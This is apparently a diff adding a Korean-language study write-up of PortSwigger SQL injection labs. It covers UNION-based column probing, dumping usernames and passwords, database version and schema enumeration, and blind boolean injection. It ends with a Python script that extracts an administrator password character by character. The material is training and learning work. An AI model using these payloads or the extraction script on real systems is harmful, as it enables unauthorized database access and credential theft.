@@ -288,3 +288,412 @@ SQL injection UNION 공격은 삽입된 쿼리로부터 얻는 결과를 조회�
 
 ## 🚩Lab: SQL injection UNION attack, finding a column containing text
 
+우선 카테고리 선택 시 요청하는 패킷에서 포함되는 `category` 매개변수 값에서 SQL 인젝션이 가능함을 알 수 있다. 이때 사용하는 데이터베이스 테이블의 컬럼에 문자열이 포함되어 있는지를 확인해야 한다. 이를 위해서는 먼저 테이블의 컬럼의 수가 몇인지를 조사해야 한다.
+
+<br>
+
+```
+GET /filter?category='+UNION+SELECT+NULL,NULL,NULL+-- HTTP/2
+```
+
+SQL injection UNION 공격을 이용하여 null 값을 늘려가며 테이블의 컬럼 수가 몇인지를 조사할 수 있다. 위의 요청처럼 null 값이 3개일 때 반환되는 페이지에서 에러 메시지가 출력되지 않는 것을 확인할 수 있고, 따라서 테이블의 컬럼이 3개임을 알 수 있다.
+
+<br>
+
+```
+'+UNION+SELECT+bdQCPq,NULL,NULL+--
+'+UNION+SELECT+NULL,'bdQCPq',NULL+--
+'+UNION+SELECT+NULL,NULL,'bdQCPq'+--
+```
+
+이제 주어진 문자열 `bdQCPq`을 이용하여 테이블에 문자열이 포함되어 있는지를 확인해보자. null 값의 위치에 해당 문자열을 넣어서 페이로드를 구성하면 위와 같은 3가지 경우가 있을 것이다. 위의 경우를 모두 시도해본 결과 문자열이 두 번째 컬럼에 존재함을 알 수 있고, 문제를 해결할 수 있다.
+
+<br><br>
+
+# #Using a SQL injection UNION attack to retrieve interesting data
+
+원래 쿼리로부터 반환받은 컬럼의 수를 알아내었고 어떤 컬럼이 문자열 데이터를 가지고 있는지를 찾아내었으면, 이제 관심 있는 데이터를 얻을 수 있다.
+
+<br>
+
+- 원래 쿼리가 두 개의 컬럼을 반환하고, 두 컬럼 모두 문자열 데이터를 갖고 있다.
+- injection 포인트가 `WHERE`절 쿼터 스트링 내에 포함되어 있다.
+- 데이터베이스가 `username`과 `password` 컬럼을 갖고 있는 `users` 테이블을 포함하고 있다.
+
+위와 같은 상황이라고 가정해보자.
+
+<br>
+
+`' UNION SELECT username, password FROM users--`
+
+이 예시에서 위의 input을 제출함으로써 `users` 테이블의 내용을 조회할 수 있다. 이 공격을 수행하기 위해서는 두 개의 컬럼 `username`과 `password`를 가진 `users` 테이블이 있다는 사실을 알고 있어야 한다. 이 정보가 없다면 테이블과 컬럼의 이름을 추측해야할 것이다. 모든 최신 데이터베이스들은 데이터베이스 구조를 검사하고 데이터베이스에 포함된 테이블과 열을 확인하는 방법을 제공한다.
+
+<br>
+
+## 🚩Lab: SQL injection UNION attack, retrieving data from other tables
+
+문제에서 제공하는 정보에 따라 이 서비스에서 사용하는 데이터베이스에는 `username`과 `password` 컬럼을 가진 `users` 테이블이 존재한다. `administrator` 계정 정보를 얻기 위해서는 SQL injection 취약점이 존재하는 상품 카테고리 필터 기능에서 UNION절을 이용하여 `users` 테이블의 내용을 조회해야할 것이다.
+
+<br>
+
+```
+/filter?category='+UNION+SELECT+username,password+FROM+users--+
+```
+
+앞에서 언급한대로 페이로드를 작성하여 위의 경로로 요청을 보내보자.
+
+<br>
+
+![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/bfd3401c-cc6d-431f-9ca8-8ada9ec79f68)
+
+그러면 사진과 같이 테이블에 있는 모든 내용을 확인할 수 있다. 이제 획득한 `administrator` 계정으로 로그인하면 문제를 해결할 수 있다.
+
+<br><br>
+
+# #Retrieving multiple values within a single column
+
+어떤 경우에서는 이전 예시의 쿼리가 단일 컬럼만을 반환할 수도 있다. 이때는 값을 함께 연결하면 이 단일 컬럼 내에서 여러 값을 함께 검색할 수 있다. 연결한 값을 구분할 수 있도록 구분자를 포함할 수 있다.
+
+<br>
+
+`' UNION SELECT username || '~' || password FROM users--`
+
+예를 들어 Oracle에서 위와 같은 입력 값을 제출할 수 있다. Oracle에서 문자열을 연결할 수 있는 연산자인 이중 파이프 시퀀스 `||`를 사용한다. 삽입된 쿼리는 `~` 문자로 분리된 `username`과 `password` 필드의 값을 연결한다.
+
+<br>
+
+```
+...
+administrator~s3cure
+wiener~peter
+carlos~montoya
+...
+```
+
+이 쿼리에 대한 결과는 위와 같이 모든 사용자명과 패스워드를 포함한다. 더 많은 문자열 연결 연산자는
+
+<br>
+
+## 🚩Lab: SQL injection UNION attack, retrieving multiple values in a single column
+
+이전에 진행했던 랩과 마찬가지로 순서대로 SQL injection을 진행하면서 `administrator` 계정 정보를 찾아내자.
+
+<br>
+
+1. NULL 값의 수를 늘려가며 해당 테이블의 컬럼 개수를 조사한다. 아래 경로로 요청을 하면 서버 에러가 나타나지 않기에 컬럼의 수는 2개임을 알 수 있다.
+
+    `/filter?category='+UNION+SELECT+NULL,NULL+--`
+
+    <br>
+
+2. 문자열 데이터를 갖고 있는 컬럼을 조사한다. 이를 위해서는 아래와 같이 2개의 경로로 요청해볼 수 있는데, 두 번째 경로에서 에러가 나타나지 않는 것으로 보아 두 번째 컬럼만 문자열 데이터를 갖고 있음을 알 수 있다.
+
+    ```
+    /filter?category='+UNION+SELECT+'a',NULL+--
+    /filter?category='+UNION+SELECT+NULL,'a'+--
+    ```
+
+    <br>
+
+3. 문제에서 `users` 테이블에서 `username`과 `password` 컬럼이 존재한다는 사실을 주어졌고 두 컬럼 정보를 두 번째 컬럼 하나에서 조회할 수 있도록 쿼리를 구성해야한다. 문자열 연결 연산자 `||`를 이용하고 두 문자열을 구분하기 위해 구분자를 `/`로 하여 다음과 같이 페이로드를 구성할 수 있다.
+
+    `'+UNION+SELECT+NULL,username+||+'/'+||+password+FROM+users+--`
+
+    <br>
+
+![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/f47971ca-7894-427d-ba99-59d4462bf7b4)
+
+이제 모든 계정 정보를 위와 같이 확인할 수 있고, `administrator` 계정으로 로그인하면 문제를 해결할 수 있다.
+
+<br><br>
+
+# #Examining the database in SQL injection attacks
+
+- 데이터베이스 소프트웨어의 타입과 버전
+- 데이터베이스가 포함하고 있는 테이블과 컬럼
+
+SQL injection 취약점을 익스플로잇하기 위해서는 위의 정보를 포함한 데이터베이스에 대한 정보를 찾는 것이 필수적이다.
+
+<br>
+
+## Querying the database type and version
+
+제공되는 특정 쿼리를 삽입함으로써 데이터베이스의 타입과 버전을 알아낼 수 있다.
+
+<br>
+
+|Database type|Query|
+|--|--|
+|Microsoft, MySQL|`SELECT @@version`|
+|Oracle|`SELECT * FROM v$version`|
+|PostgreSQL|`SELECT version()`|
+
+위의 표는 주요 데이터베이스 타입에 따른 데이터베이스 버전을 조사하는 쿼리이다.
+
+<br>
+
+`' UNION SELECT @@version--`
+
+위와 같이 `UNION` 공격을 이용할 수 있다.
+
+<br>
+
+```
+Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
+Mar 18 2018 09:11:49
+Copyright (c) Microsoft Corporation
+Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
+```
+
+위는 앞선 입력에 대한 반환되는 결과이다. 이 경우에는 데이터베이스가 Microsoft SQL Server이고 사용된 버전을 확인할 수 있다.
+
+<br>
+
+## 🚩Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+앞선 랩과 같이 가장 먼저 테이블의 컬럼 수를 조사해야 한다. UNION 공격을 통해 컬럼이 2개 존재함을 알 수 있다.
+
+<br>
+
+두 번째로 컬럼 중 문자열 데이터를 포함한 컬럼을 조사해야 한다. 마찬가지로 UNION 공격을 통해 두 컬럼 모두 문자열 데이터를 포함하고 있다는 사실을 알 수 있다.
+
+<br>
+
+`/filter?category='+UNION+SELECT+@@version,NULL+--+`
+
+이제 데이터베이스의 버전을 조사할 수 있는 `@@version`을 포함하여 위와 같이 페이로드를 작성하고 경로로 요청을 해보자.
+
+<br>
+
+![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/f3cc1659-20d9-4eac-abae-760b207fd1ac)
+
+위와 같이 데이터베이스의 버전을 획득할 수 있고 문제를 해결할 수 있다.
+
+<br>
+
+## Listing the contents of the database
+
+Oracle을 제외한 대부분의 데이터베이스 타입은 information schema라고 불리는 집합이 있다. 이는 데이터베이스에 대한 정보를 제공한다.
+
+<br>
+
+`SELECT * FROM information_schema.tables`
+
+예를 들어, `information_schema.tables`를 쿼리하여 데이터베이스 내에 테이블을 나열할 수 있다.
+
+<br>
+
+```
+TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
+=====================================================
+MyDatabase     dbo           Products    BASE TABLE
+MyDatabase     dbo           Users       BASE TABLE
+MyDatabase     dbo           Feedback    BASE TABLE
+```
+
+이는 위와 같은 결과를 반환하는데, `Products`, `Users`, `Feedback`이라는 세 개의 테이블이 존재한다는 것을 알려준다.
+
+<br>
+
+`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`
+
+`information_schema.columns`을 쿼리하여 개별 테이블 내의 컬럼을 나열할 수 있다.
+
+<br>
+
+```
+TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
+=================================================================
+MyDatabase     dbo           Users       UserId       int
+MyDatabase     dbo           Users       Username     varchar
+MyDatabase     dbo           Users       Password     varchar
+```
+
+이는 위와 같은 결과를 반환하는데, 특정한 테이블에 있는 컬럼과 각 컬럼의 데이터 타입을 보여준다.
+
+<br>
+
+## 🚩Lab: SQL injection attack, listing the database contents on non-Oracle databases
+
+앞선 랩과 같이 테이블의 컬럼 수를 조사하여 2개임을 알아내고, 컬럼 중에서 문자열 데이터를 갖고 있는 컬럼을 조사하여 두 컬럼 모두 문자열 데이터를 가지고 있는 사실을 알아낸다.
+
+<br>
+
+이제 `administrator` 계정에 대한 정보를 얻기 위해서는 계정 정보가 저장되어 있는 테이블의 이름을 알아내어 해당 테이블의 내용을 모두 확인하면 된다.
+
+<br>
+
+`/filter?category='+UNION+SELECT+version(),NULL+--`
+
+우선 위의 경로로 요청을 보내어 사용된 데이터베이스의 타입이 PostgreSQL이라는 것을 알 수 있다.
+
+<br>
+
+`/filter?category='+UNION+SELECT+TABLE_NAME,NULL+FROM+information_schema.tables+--`
+
+먼저 계정 정보가 저장되어 있는 테이블의 이름을 알아내어 보자. 위의 경로로 요청을 보내면 데이터베이스에 포함된 모든 테이블 정보를 알 수 있다.
+
+<br>
+
+![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/5de051e3-3d59-4b7d-977c-ada4e1539ed6)
+
+그 중에서 사용자 정보를 담고 있을 것 같은 테이블을 찾기 위해 `user` 키워드를 갖고 있는 테이블을 찾아보면 위와 같이 `users_gsszwa` 테이블을 확인할 수 있다.
+
+
+<br>
+
+`/filter?category='+UNION+SELECT+COLUMN_NAME,DATA_TYPE+FROM+information_schema.columns+WHERE+TABLE_NAME='users_gsszwa'+--`
+
+이제 위와 같이 페이로드를 작성하고 경로로 요청을 보내어 해당 테이블에 어떤 컬럼을 갖고 있고 그 컬럼의 데이터 타입이 무엇인지를 조사하자.
+
+<br>
+
+![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/e8c77b6e-cad2-45b9-8456-258d47c1f17f)
+
+위와 같이 사용자의 이름과 비밀번호를 저장하는 것으로 보이는 컬럼 `username_qyzfav`과 `password_fjhdhf`을 찾아내었다.
+
+<br>
+
+`/filter?category='+UNION+SELECT+username_qyzfav,password_fjhdhf+FROM+users_gsszwa+--`
+
+앞에서 찾아낸 컬럼명을 이용하여 해당 테이블에 있는 모든 사용자명과 패스워드를 조회해보자.
+
+<br>
+
+![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/79b9b6f1-c755-41ec-94b0-a1735e4d481f)
+
+위와 같이 모든 사용자의 사용자명과 패스워드를 획득할 수 있고, `administrator` 계정으로 로그인하면 문제를 해결할 수 있다.
+
+<br><br>
+
+# #Blind SQL injection
+
+애플리케이션이 SQL 인젝션에 취약하지만 HTTP 응답에 SQL 쿼리와 관련된 결과나 어떠한 데이터베이스 에러 정보도 포함되어 있지 않을 때 블라인드 SQL 인젝션이 발생한다. `UNION` 공격과 같이 많은 기술이 블라인드 SQL 인젝션 취약점에 효과적이지 않다. 이는 애플리케이션의 응답 내에 삽입된 쿼리의 결과를 볼 수 있는지에 달려 있기 때문이다. 블라인드 SQL 인젝션 역시 허가되지 않은 데이터에 접근할 수 있으나, 다른 기술이 사용되어야 한다.
+
+<br>
+
+## Exploiting blind SQL injection by triggering conditional responses
+
+`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`
+
+추적 쿠키를 사용하여 사용량에 대한 분석을 수집하는 애플리케이션을 생각해보자. 애플리케이션에 대한 요청은 위와 같은 쿠키 헤더를 포함한다.
+
+<br>
+
+`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`
+
+`TrackingId` 쿠키를 포함하는 요청이 진행될 때, 애플리케이션은 이것이 알고 있는 사용자인지를 조사하기 위해 위와 같은 SQL 쿼리를 사용한다.
+
+<br>
+
+이 쿼리는 SQL 인젝션에 취약하나, 쿼리에 대한 결과는 사용자에게 반환되지 않는다. 그러나, 애플리케이션은 쿼리가 어떠한 데이터를 반환하는지에 따라 다르게 동작한다. 만약에 알고 있는 `TrackingId`를 제출한다면, 쿼리는 데이터를 반환하고 "Welcome back"과 같은 메시지를 응답으로 받을 것이다.
+
+<br>
+
+이 동작은 블라인드 SQL 인젝션 취약점을 익스플로잇 하기에 충분하다. 삽입된 조건에 따라 조건부로 다른 응답을 발생시켜 정보를 검색할 수 있다.
+
+<br>
+
+```
+…xyz' AND '1'='1
+…xyz' AND '1'='2
+```
+
+이 익스플로잇이 작동하는 방법을 이해하기 위해서는 위와 같이 두 개의 요청이 `TrackingId` 쿠키 값을 포함하여 차례로 전송된다고 가정해보자.
+
+- 첫 번째 값은 쿼리가 결과를 반환하도록 만드는데, 이는 삽입된 `AND '1'='1` 조건이 참이기 때문이다. 결과적으로 "Welcome back" 메시지가 표시된다.
+- 두 번째 값은 쿼리가 어떠한 결과도 반환하지 않도록 하는데, 이는 삽입된 조건이 거짓이기 때문이다. "Welcome back" 메시지는 표시되지 않는다.
+
+<br>
+
+이는 어떠한 삽입된 단일 조건에 대한 답을 결정할 수 있도록하고 한 번에 한 조각씩 데이터를 추출할 수 있다.
+
+<br>
+
+예를 들어, `Username`과 `Password` 컬럼을 가진 `Users` 테이블이 있고 `Administrator`라 불리는 사용자가 있다고 가정해보자. 한 번에 한 문자씩 패스워드를 테스트하기 위해서 일련의 입력을 전송함으로써 이 사용자에 대한 패스워드를 결정할 수 있다.
+
+<br>
+
+`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`
+
+이를 위해서는 입력 값이 위와 같이 시작한다. 이는 "Welcome back" 메시지를 반환하고, 삽입된 조건이 참이고 따라서 패스워드의 첫 번째 문자가 `m`보다 크다는 것을 의미한다.
+
+<br>
+
+`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't`
+
+다음 입력은 "Welcome back" 메시지를 반환하지 않고, 삽입된 조건이 거짓이며 따라서 패스워드의 첫 번째 문자가 `t` 보다 작다는 것을 의미한다.
+
+<br>
+
+`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`
+
+결국 위의 입력 값을 전송하면 "Welcome back" 메시지를 반환받고, 이로 인하여 패스워드의 첫 번째 문자가 `s`라는 것을 확인할 수 있다. 이 과정을 계속하여 `Administrator` 사용자에 대한 전체 패스워드를 시스템적으로 결정할 수 있다.
+
+<br>
+
+> `SUBSTRING` 함수는 몇 개의 데이터베이스 타입에서 `SUBSTR`로 불린다.
+{: .prompt-info}
+
+<br>
+
+## 🚩Lab: Blind SQL injection with conditional responses
+
+문제로부터 데이터베이스가 `username`과 `password` 컬럼을 가진 `users` 테이블을 포함한다는 것을 알 수 있다.
+
+<br>
+
+![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/78e1a47c-cce6-46dc-b44c-f07bb3997cc0)
+
+메인 페이지에 접속하면 "Welcome back!"이라는 문구를 볼 수 있고 사이트의 쿠키 값을 보면 `TrackingId` 이름으로 쿠키 값이 설정되어 있는 것을 확인할 수 있다.
+
+<br>
+
+`wW7o8TT4H4qCkL3i' AND length((SELECT password FROM users WHERE username = 'administrator')) < 30 --`
+
+이제 패스워드 값을 알아내기 위해 `TrackingId` 값에 SQL 인젝션을 시도해보자. 우선, `SUBSTRING()` 함수를 바로 사용하여 패스워드를 첫 번째 자리부터 하나씩 알아갈 수도 있지만 길이를 우선 알고 있으면 더 편하게 구할 것이라고 생각하여 위와 같이 `LENGTH()` 함수를 사용하여 패스워드의 길이를 알아내었다. 알아낸 패스워드의 길이는 `20`이었다.
+
+<br>
+
+본격적으로 SUBSTRING 함수를 이용하여 20자의 패스워드를 알아내면 된다. 하지만 길이가 길기 때문에 범위를 계속 좁혀가며 요청을 보내어 패스워드 한 자씩을 알아내는 과정에 시간이 많이 필요할 것이다. 따라서 이를 자동화 할 수 있는 Python 코드를 작성해보았다.
+
+<br>
+
+```python
+import requests
+
+url='https://0a46006704e89589879a489c00f4006f.web-security-academy.net/'
+password = ""
+
+for i in range(20):
+    low = 32
+    high = 126
+
+    while low+1 < high:
+        mid = (low + high) // 2
+        headers = {
+            "session":"jffFsB8D5nZUH4r1wUjKQqiprYScqqvV",
+            "Cookie": f"TrackingId=wW7o8TT4H4qCkL3i' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {i+1}, 1) < '{chr(mid)}"
+        }
+        response = requests.get(url, headers=headers)
+
+        if "Welcome back!" in response.text:
+            high = mid
+        else:
+            low = mid
+
+    password += chr(low)
+    print(f"Temp Password: {password}")
+
+print(f"Password: {password}")
+```
+
+위의 코드를 실행하면 한 자씩 이진 탐색하며 패스워드를 알아낼 수 있다.
+
+<br>
+
+![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/9ccfc2bd-7211-4d08-96da-79e968542d31)
+
+알아낸 패스워드로 `administrator` 계정에 로그인하면 문제를 해결할 수 있다.
+
+<br><br>
